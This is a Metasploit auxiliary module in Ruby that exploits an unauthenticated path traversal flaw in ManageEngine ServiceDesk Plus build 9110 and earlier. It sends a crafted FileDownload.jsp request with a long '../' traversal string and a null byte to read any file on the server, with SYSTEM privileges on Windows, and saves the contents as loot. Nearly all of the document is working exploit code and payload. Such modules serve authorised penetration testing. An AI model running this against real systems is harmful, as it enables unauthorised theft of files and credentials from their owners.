##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine ServiceDesk Plus Path Traversal",
      'Description'    => %q{
        This module exploits an unauthenticated path traversal vulnerability found in ManageEngine
        ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem
        with the same privileges as Support Center Plus is running. On Windows, files can be retrieved
        with SYSTEM privileges.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
      'References'     =>
        [
        ],
      'DisclosureDate' => "Oct 03 2015"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),
        OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])
      ], self.class)
  end

  def run_host(ip)
    uri = target_uri.path
    peer = "#{ip}:#{rport}"

    vprint_status("#{peer} - Retrieving file #{datastore['FILE']}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp"),
      'vars_get' =>
      {
        'module' => 'support',
        'fName' => "/../../../../../../../../../../../../#{datastore['FILE']}\x00",
      }
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have retrieved the file either. Print the status code for debugging purposes.
    # The "The File was not found" string is returned on a vulnerable environment but the file is not found.
    # The "Loding domain list To login AD authentication or local Authentication" string is returned in the response on a fixed version (build 9111)
    if res && res.code == 200
      if res.body =~ /The File was not found/
        vprint_error("#{peer} - Vulnerable server, but the file does not exist!")
      elsif res.body =~ /Loding domain list To login AD authentication or local Authentication/
        vprint_error("#{peer} - The installed version of ManageEngine ServiceDesk Plus is not vulnerable!")
      else
        data = res.body
        p = store_loot(
          'manageengine.servicedeskplus',
          'application/octet-stream',
          ip,
          data,
          datastore['FILE']
        )
        print_good("#{peer} - [ #{datastore['FILE']} ] loot stored as [ #{p} ]")
      end
    else
        vprint_error("#{peer} - Server returned #{res.code.to_s}")
    end
  end
end

